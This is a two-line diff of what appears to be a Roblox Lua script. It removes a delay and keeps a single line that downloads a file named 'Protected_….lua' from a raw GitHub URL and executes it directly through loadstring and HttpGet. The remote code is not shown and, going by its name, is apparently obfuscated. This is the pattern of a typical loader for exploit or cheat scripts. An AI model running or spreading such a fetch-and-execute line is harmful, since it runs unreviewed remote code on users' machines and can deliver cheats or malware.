@@ -1,2 +1,1 @@
-wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/S2hub3/s7/refs/heads/main/Protected_5301343724657238.lua"))()
